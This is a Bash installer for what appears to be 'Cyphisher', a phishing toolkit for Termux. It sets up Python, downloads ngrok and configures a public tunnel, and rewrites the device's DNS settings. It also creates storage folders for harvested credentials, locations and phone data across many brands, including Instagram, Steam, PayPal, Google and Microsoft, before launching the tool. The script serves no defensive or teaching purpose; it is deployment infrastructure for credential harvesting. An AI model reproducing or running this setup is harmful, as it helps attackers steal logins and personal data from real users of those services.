#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux + Ngrok Fix
# ===============================

AUTO_NGROK="${AUTO_NGROK:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
NGROK_DIR="ngrok"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تابع برای رفع مشکل certificate و DNS
fix_system_issues() {
    log "🔧 Fixing system issues..."
    
    # نصب ca-certificates برای رفع مشکل certificate
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg install -y ca-certificates openssl-tool 2>/dev/null || true
        update-ca-certificates --fresh 2>/dev/null || true
    fi
    
    # تنظیم DNS سرورهای معتبر
    if [ -w "$PREFIX/etc/resolv.conf" ]; then
        echo "nameserver 8.8.8.8" > $PREFIX/etc/resolv.conf
        echo "nameserver 1.1.1.1" >> $PREFIX/etc/resolv.conf
        echo "nameserver 208.67.222.222" >> $PREFIX/etc/resolv.conf
        log "✅ DNS servers configured"
    fi
    
    log "✅ System issues fixed"
}

# پاکسازی کامل ngrok قبلی
cleanup_old_ngrok() {
    log "🧹 Cleaning up previous ngrok installations..."
    
    # Kill any running ngrok processes
    pkill -f ngrok || true
    sleep 2
    
    rm -rf "${NGROK_DIR}" 2>/dev/null || true
    rm -f "ngrok" 2>/dev/null || true
    rm -f "ngrok.log" 2>/dev/null || true
    rm -f "ngrok.zip" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# نصب پایتون و ابزارهای لازم
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget unzip openssl-tool -y
    else
        log "Please install Python and Git manually for your system"
        return 1
    fi
}

# ایجاد محیط مجازی پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
        log "✅ Virtual environment created"
    fi
    
    if [ -f "${VENV_DIR}/bin/activate" ]; then
        source "${VENV_DIR}/bin/activate"
    else
        error "Could not activate virtual environment"
        return 1
    fi
    
    pip install --upgrade pip setuptools wheel
    
    # نصب requirements اضافی برای ngrok
    pip install requests rich pyfiglet flask flask-cors
    
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt
        log "✅ Requirements installed"
    else
        # ایجاد فایل requirements.txt اگر وجود ندارد
        cat > requirements.txt << EOF
requests==2.31.0
rich==13.5.2
pyfiglet==0.8.post1
flask==2.3.3
flask-cors==4.0.0
EOF
        pip install -r requirements.txt
        log "✅ Basic packages installed"
    fi
    
    log "✅ Python environment ready"
}

# دانلود ngrok
download_ngrok_guaranteed() {
    log "🌐 Downloading ngrok for Termux..."
    
    mkdir -p "$NGROK_DIR"
    
    # URL جدید برای ngrok
    URL="https://github.com/ngrok/ngrok-arm64/releases/download/latest/ngrok-v3-stable-linux-arm64.tgz"
    OUTPUT_FILE="${NGROK_DIR}/ngrok.tar.gz"
    
    rm -f "$OUTPUT_FILE" 2>/dev/null || true
    
    log "📥 Downloading ngrok from: $URL"
    
    if command -v curl >/dev/null 2>&1; then
        log "🔻 Using curl for download..."
        if ! curl -L --progress-bar -o "$OUTPUT_FILE" "$URL"; then
            error "❌ Download failed with curl, trying alternative URL..."
            # URL جایگزین
            URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
            curl -L --progress-bar -o "$OUTPUT_FILE" "$URL" || {
                error "❌ All download attempts failed"
                return 1
            }
        fi
    elif command -v wget >/dev/null 2>&1; then
        log "🔻 Using wget for download..."
        if ! wget -O "$OUTPUT_FILE" "$URL"; then
            error "❌ Download failed with wget, trying alternative URL..."
            URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
            wget -O "$OUTPUT_FILE" "$URL" || {
                error "❌ All download attempts failed"
                return 1
            }
        fi
    else
        error "❌ Neither curl nor wget available"
        return 1
    fi
    
    # Extract ngrok
    log "📦 Extracting ngrok..."
    if [[ "$OUTPUT_FILE" == *.zip ]]; then
        unzip -o "$OUTPUT_FILE" -d "$NGROK_DIR"
    else
        tar -xzf "$OUTPUT_FILE" -C "$NGROK_DIR"
    fi
    
    # پیدا کردن فایل ngrok
    if [ -f "${NGROK_DIR}/ngrok" ]; then
        NGROK_BINARY="${NGROK_DIR}/ngrok"
    else
        # جستجو برای فایل ngrok در محتوای extracted
        NGROK_BINARY=$(find "$NGROK_DIR" -name "ngrok" -type f | head -1)
        if [ -z "$NGROK_BINARY" ]; then
            error "❌ Could not find ngrok binary in extracted files"
            return 1
        fi
    fi
    
    # قابل اجرا کردن ngrok
    chmod +x "$NGROK_BINARY"
    
    # ایجاد لینک سمبلیک
    ln -sf "$NGROK_BINARY" "${NGROK_DIR}/ngrok"
    
    export PATH="$NGROK_DIR:$PATH"
    
    # تست ngrok
    log "🧪 Testing ngrok..."
    if "${NGROK_DIR}/ngrok" --version; then
        log "✅ ngrok downloaded and working"
    else
        error "❌ ngrok test failed"
        return 1
    fi
}

# پیکربندی ngrok
configure_ngrok() {
    log "⚙️ Configuring ngrok..."
    
    # ایجاد پیکربندی اولیه برای ngrok
    mkdir -p ~/.config/ngrok
    cat > ~/.config/ngrok/ngrok.yml << EOF
version: "2"
authtoken: 
tunnels:
  webapp:
    proto: http
    addr: 5001
    bind_tls: true
EOF
    
    log "✅ ngrok configured"
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
        "Pages" "ABOUT" "AI"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    # ایجاد فایل‌های ضروری اگر وجود ندارند
    touch "collected_data/all_devices.json"
    touch "phone_data/numbers.txt"
    
    log "✅ Directories created"
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux + Ngrok..."
    
    detect_platform
    
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is optimized for Termux only"
        exit 1
    fi
    
    fix_system_issues
    cleanup_old_ngrok
    install_dependencies
    setup_python_env
    
    if [ "$AUTO_NGROK" = "1" ]; then
        if download_ngrok_guaranteed; then
            configure_ngrok
        else
            log "⚠️ Ngrok installation failed, continuing without ngrok"
        fi
    fi
    
    create_directories
    
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    log "Ngrok: $([ -f "${NGROK_DIR}/ngrok" ] && echo 'Installed' || echo 'Not available')"
    
    log "🚀 Starting application in 3 seconds..."
    sleep 3
    
    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
        clear
        log "🏁 Launching Cyphisher..."
        export NGROK_PATH="${NGROK_DIR}/ngrok"
        export PYTHONPATH="$(pwd)"
        exec "$PYTHON_BIN" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
